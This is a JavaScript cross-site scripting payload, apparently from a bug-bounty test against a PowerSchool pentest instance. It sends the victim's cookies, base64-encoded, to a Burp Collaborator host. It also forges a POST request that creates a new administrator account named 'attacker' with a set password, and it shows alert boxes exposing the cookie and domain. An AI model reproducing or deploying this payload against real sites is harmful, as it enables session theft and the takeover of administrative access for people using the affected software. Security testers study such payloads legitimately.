alert(document.cookie);
alert(document.domain);
function stealCookies(){
  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}

window.open("https://pentest.sfe.powerschool.com/profileMainNewInitAction.do");
// add new administrator account
var httpRequest = new XMLHttpRequest();//


httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); 
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpRequest.send('employeeSearchId=&accessIdStr=9999&webPassword=AttackerMe&lastName=attacker&firstName=John&email=esperamier%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中

stealCookies();
